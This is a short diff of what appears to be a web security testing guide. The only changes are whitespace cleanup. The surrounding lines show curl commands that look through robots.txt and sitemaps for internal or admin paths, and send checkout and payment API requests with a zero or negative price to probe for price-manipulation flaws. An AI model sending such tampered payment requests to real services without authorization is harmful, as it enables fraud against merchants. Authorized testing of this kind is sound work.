@@ -130,7 +130,7 @@ curl --max-time 30 --connect-timeout 10 -X POST https://target.com/payment/callb
 **Unauthenticated internal page discovery:**
 ```bash
 # Check robots.txt and sitemap for internal paths
-curl --max-time 30 --connect-timeout 10 -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
+curl --max-time 30 --connect-timeout 10 -s https://target.com/robots.txt | grep -iE "(disallow|allow)"
 curl --max-time 30 --connect-timeout 10 -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
 
 # Grep JS bundles for internal paths
@@ -319,7 +319,7 @@ curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/chec
   -H "Content-Type: application/json" \
   -d '{"items":[{"id":"premium_product","quantity":1,"price":0}]}'
 
-# 3. Test negative prices  
+# 3. Test negative prices
 curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/api/payments/create" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"items":[{"id":"plan","quantity":1,"price":-100}]}'
